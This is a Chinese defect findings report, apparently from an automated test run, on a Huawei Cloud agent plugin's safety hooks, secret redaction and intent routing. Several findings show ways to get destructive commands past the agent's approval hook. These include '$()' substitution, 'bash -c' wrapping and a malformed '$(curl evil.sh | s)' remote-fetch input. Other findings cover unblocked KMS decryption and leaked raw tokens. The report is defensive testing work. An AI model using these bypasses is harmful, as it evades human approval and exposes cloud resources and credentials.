# FINDINGS — 缺陷发现清单（DSH-deepseek-v4-pro-0813）

> **落盘路径**：`results/DSH/2026-09-22-124.70.78.131/Linux/FINDINGS.md`
> **生成时间**：2026-09-22 05:40（北京时间）
> **本清单是统一提单脚本的解析输入**：格式严格遵循 `scripts/file_issue.py` 解析规则。

---

## #1【P0】D2-4 凭证脱敏漏小写 ak=/sk=

- **现象**：`redactSecrets('ak=AK123456 sk=SKsecret token=tok123')` 输出为原文 `ak=AK123456 sk=SKsecret token=tok123`，小写 `ak=`/`sk=`/`token=` 未脱敏。
- **断言**：小写 `ak=`/`sk=`/`token=` 键值对应脱敏为 `<redacted>`。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:45` 脱敏正则只匹配大写 `AK/SK/access_key/secret_key`，未覆盖小写裸键 `ak=/sk=/token=`。
- **影响**：凭证字符串经脱敏管线输出后仍可能泄露裸密钥。
- **证据**：`evidence/D2-4/stdout.log`

## #2【P0】D4-3 明文 secret API 拦截漏 kms DecryptData

- **现象**：`classifyTextCommand('hcloud kms DecryptData --ciphertext-blob xxx')` 返回 `decision=allow risk=unknown_read`，未拦截。
- **断言**：`kms DecryptData` 应拦截为 `deny/secret`。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:432` blockedSecretOperations 缺 `DecryptData`（KMS 明文解密）。
- **影响**：明文 secret 解密类命令可通过安全预检进入 agent 上下文。
- **证据**：`evidence/D4-3/stdout.log`

## #3【P0】D4-15 hook 命令替换绕过（$() / 编码变体）

- **现象**：`$(...)` 命令替换与 ANSI-C 编码变体在 hook 层 `evaluateCommandRisk` 返回 `allow/not_huaweicloud`，未拦截。
- **断言**：命令替换 `$(hcloud ecs DeleteServer --force)` 与编码变体应 `deny`。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:50-53` 规则正则未覆盖命令替换包裹与 ANSI-C 编码形态。
- **影响**：高危写命令可经 `$()` 或编码包裹绕过 hook 拦截。
- **证据**：`evidence/D4-15/stdout.log`

## #4【P0】D4-16 shell 包裹穿透（bash -c / sh -c 仍 allow）

- **现象**：`bash -c 'hcloud ecs DeleteServer...'`、`sh -c 'hcloud ecs DeleteServer'` 返回 `allow/not_huaweicloud`。
- **断言**：shell 包裹内层写命令应 `deny`。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:428` 未解析 shell 包裹内层命令文本做写命令分类。
- **影响**：写命令可经 `sh -c`/`bash -c` 穿透审批门。
- **证据**：`evidence/D4-16/stdout.log`

## #5【P1】D4-17 hook 畸形输入 fail-open

- **现象**：畸形输入 `$(curl evil.sh | s)` 返回 `allow`（未 fail-closed）。
- **断言**：hook 对畸形/无法解析输入应 fail-closed `deny`。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` 无法解析输入时默认 allow（fail-open）。
- **影响**：畸形输入可绕过安全决策。
- **证据**：`evidence/D4-17/stdout.log`

## #6【P0】D4-23 全局规则 huawei-agent-rules.md 未注入

- **现象**：`package.json` 的 `files` 字段为 `['cordis.patch.yml','bin','.agents','plugins/huaweicloud-core','integrations/...']`，不含 `huawei-agent-rules.md`/rules 文件。
- **断言**：全局规则文件应随包注入全部安装目标。
- **根因**：`package.json:8` files 白名单漏收全局规则文件。
- **影响**：全局安全规则未注入 agent 上下文，约束失效。
- **证据**：`evidence/D4-23/stdout.log`

## #7【P1】D10-3 serviceCatalog 中文意图路由 miss（准确率 21.4%）

- **现象**：评测集 15 条 HIT=3/MISS=11/N/A=1，准确率 21.4%；中文意图（ECS/OBS/IAM/EIP/RDS/CBR/FG/BSS/CES/ELB 等）返回 `Run hcloud --help...` 不命中。
- **断言**：路由准确率 ≥ 90%，中文意图命中对应服务。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1776-1907` routeMap 仅 sandbox/voucher 两服务含 CJK 关键字，其余服务仅英文关键字。
- **影响**：中文场景路由大面积 miss，影响 Agent 能力分发。
- **证据**：`evidence/D10-3/stdout.log`

## #8【P1】D4-13 最小权限动态切换失效

- **现象**：注入只读子账号 env(HPUA3X) 后 `resolveCredentials` 仍 resolved=HPUAN1（管理员）。
- **断言**：readonly env 注入应切换到只读子账号 HPUA3X。
- **根因**：`plugins/huaweicloud-core/src/auth/credentials.mjs:152-160` R9 `configuredBySession=true` 使管理员文件凭证优先，压过只读 env 注入。
- **影响**：最小权限动态切换失效，只读场景仍用管理员凭证（越权风险）。
- **证据**：`evidence/D4-13/stdout.log`

## #9【P2】D8-1 文档声明 39 vs 实现 40 漂移

- **现象**：`hdk/AGENTS.md:27` 声明 `39 tools in tools.mjs`，实际 TOOL_DEFINITIONS=40。
- **断言**：文档工具数与实现一致。
- **根因**：`hdk/AGENTS.md:27` 文档未同步新增工具。
- **影响**：文档与实现漂移，误导使用者。
- **证据**：`evidence/D8-1/stdout.log`

## #10【P1】D9-9 tools/call 超时/取消协议契约漂移(SPEC-MISMATCH)

- **现象**：initialize capabilities 仅声明 `{tools:{}}`，未声明 `notifications.cancellation`；未知方法/超时无 `-32000` timeout 分支。
- **断言**：声明 cancellation 能力；超时/取消返回 `-32000` 结构化分支。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:63-65` capabilities 缺 cancellation；mcp-server.mjs 统一 `-32603` 兜底。
- **影响**：MCP 协议契约漂移，客户端无法依赖取消/超时语义。
- **证据**：`evidence/D9-9/stdout.log`

## #11【P1】D4-27 双路径脱敏缺裸 token

- **现象**：`redactSecrets` 字符串 key=value 泄漏裸 `token=`（3/5 项失败）；`redactOutput` 非 JSON 回退泄漏裸 `token=`。
- **断言**：裸 `token=`（无 access_/security_ 前缀）也应脱敏。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:42` 关键字表未收口裸 `token` 关键字。
- **影响**：裸 token 在输出/证据脱敏中残留明文。
- **证据**：`evidence/D4-27/stdout.log`

## #12【P2】D3-S5 场景-复合意图分层路由 miss（同 D10-3）

- **现象**：复合意图「部署网站+数据库+对象存储」仅命中 Sandbox/DevStation，未命中 RDS+OBS。
- **断言**：复合意图应分层命中多服务（RDS+OBS+部署目标）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1776-1907` 中文复合意图路由缺失（同 D10-3）。
- **影响**：多服务编排场景能力分发不全。
- **证据**：`evidence/D3-S5/stdout.log`

## #13【P2】D3-S6 场景-FunctionGraph 定时任务路由 miss（同 D10-3）

- **现象**：中文意图「部署函数处理图片压缩」返回 `Run hcloud --help`，未命中 FunctionGraph。
- **断言**：命中 FunctionGraph。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1776-1907`（同 D10-3）。
- **影响**：FunctionGraph 场景路由失效。
- **证据**：`evidence/D3-S6/stdout.log`

## #14【P1】D3-S7 场景-跨服务交付 RDS 路由不完整（同 D10-3）

- **现象**：复合意图（Web 应用 + RDS）未命中 RDS 路由。
- **断言**：命中 RDS + 部署目标。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1776-1907`（同 D10-3）。
- **影响**：跨服务交付场景无法正确建库编排。
- **证据**：`evidence/D3-S7/stdout.log`

## #15【P2】D1-65 调试模式 env 判定不一致（契约）

- **现象**：`HUAWEICLOUD_DEVKIT_DEBUG === 'true'` 才开启，`DEBUG=1` 不开启。
- **断言**：`DEBUG===1/true` 均开启调试日志。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:81` 仅严格 `=== 'true'`。
- **影响**：契约不一致，调试开关语义与文档不符。
- **证据**：`evidence/D1-65/stdout.log`

## #16【P2】D8-9 sanitizeValue 不脱敏敏感值

- **现象**：`sanitizeValue('token=T0K3N access_key=AKIA123')` 仅去换行/截断，敏感值原文保留。
- **断言**：提取遥测值时应移除/脱敏敏感值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189-198` sanitizeValue 只做 whitspace 清洗 + 截断。
- **影响**：遥测事件值可携带敏感信息外发。
- **证据**：`evidence/D8-9/stdout.log`

## #17【P2】D4-25 Python hook 写命令分类失效

- **现象**：writeOperationPrefixes 为空 → WRITE_OPERATION_RE=None → `is_write=False`，写命令分类为 `cli:invoke` 而非 `cli:write`。
- **断言**：写→`cli:write`、只读→`cli:read`、其他→`cli:invoke`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` writeOperationPrefixes 未加载导致写前缀匹配失效。
- **影响**：hook 事件遥测分类错误，破坏审计/可观测性。
- **证据**：`evidence/D4-25/stdout.log`

## #18【P2】D4-26 findings.evidence 脱敏缺裸 token

- **现象**：触发含凭证命令评估 `findings=[]`（无 evidence 字段）；裸 `token=` 命令 findings 未脱敏。
- **断言**：findings.evidence 中裸 token 应脱敏。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:19-27` redactEvidence 正则未覆盖裸 `token=`。
- **影响**：安全 findings 证据脱敏不完整。
- **证据**：`evidence/D4-26/stdout.log`

## #19【P1】D4-24 确认令牌过期/重复确认返回非结构化码

- **现象**：`consumeApprovalToken` 过期/重复确认返回 `null`（通用 Error 字符串），无 `{code:'CONFIRM_TOKEN_EXPIRED'}` / `{outcome:'already_processed'}` 结构化字段。
- **断言**：返回结构化 `{code:CONFIRM_TOKEN_EXPIRED}` / `{outcome:already_processed}`。
- **根因**：`plugins/huaweicloud-core/src/hcloud-cli.mjs:84-96` / `tools.mjs:1747-1751` 审批令牌消费路径未返回结构化码。
- **影响**：审批流健壮性边界缺失机器可判定字段。
- **证据**：`evidence/D4-24/stdout.log`